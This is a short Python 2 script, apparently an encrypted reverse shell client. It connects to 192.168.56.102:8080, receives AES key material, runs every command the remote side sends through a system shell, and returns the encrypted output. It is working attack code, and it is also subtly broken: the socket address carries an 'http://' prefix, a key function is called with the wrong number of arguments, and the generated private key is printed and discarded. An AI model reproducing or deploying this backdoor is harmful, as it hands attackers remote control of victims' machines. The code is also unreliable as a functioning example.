import socket, subprocess
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

def keyGen():
	newKey = RSA.generate(4096)
	#publicKey = newKey.publickey().export("PEM")
	privateKey = newKey.exportKey("PEM")
	#print "This is the publicKey", publicKey
	#print "\n\r\n\r"
	print  "This is the privateKey", privateKey
	return privateKey#, publickey

def AES_KeyGen(aes, privateKey):
	#privateKey = """ TO DO """
	decrypt = RSA.importKey(privateKey)
	AESKey = decrypt.decrypt(aes)
	return AESKey

def encrypt(msg):
	encrypt = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return encrypt.encrypt(msg)

def decrypt(msg):
	decrypt = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return decrypt.decrypt(msg)

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("http://192.168.56.102", 8080))
	global key, counter
	key = s.recv(1024)
	key = AES_KeyGen(key)
	print "AES key has been generated..." + key
	counter = s.recv(1024)
	counter = AES_KeyGen(counter)
	print "The generated counter is:  ", str(counter)
	while True:
		command = decrypt(s.recv(1024))
		print "[+]Received Command..." + command

		if 'terminate' in command:
			s.close()
			break

		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			s.send( encrypt( CMD.stdout.read()) )
			s.send( encrypt( CMD.stderr.read()) )

def main():
	keyGen()
	connect()
main()